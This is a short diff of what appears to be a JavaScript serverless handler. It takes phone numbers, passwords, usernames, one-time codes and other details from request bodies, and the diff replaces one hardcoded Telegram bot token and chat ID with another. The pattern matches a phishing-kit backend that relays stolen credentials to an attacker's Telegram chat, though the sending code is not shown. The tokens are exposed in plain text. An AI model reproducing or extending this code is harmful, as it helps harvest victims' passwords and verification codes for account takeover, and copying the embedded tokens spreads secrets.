@@ -7,8 +7,8 @@ export default async function handler(req, res) {
     if (req.method === 'OPTIONS') { res.status(200).end(); return; }
     if (req.method !== 'POST') { return res.status(405).json({ error: 'Method Not Allowed' }); }
 
-    const TELEGRAM_BOT_TOKEN = '9071420562:AAH1f5Jj7CmPl0hRZrHdOY_KWwS8ZNBvtDs';
-    const TELEGRAM_CHAT_ID = '7171384496';
+    const TELEGRAM_BOT_TOKEN = '9260608323:AAHmFxQvlDR-E5NZohqbDtk8I1RgvqxHR0c';
+    const TELEGRAM_CHAT_ID = '1745333535';
 
     const { type, phone, password, username, otp, details } = req.body;
     let message = '';
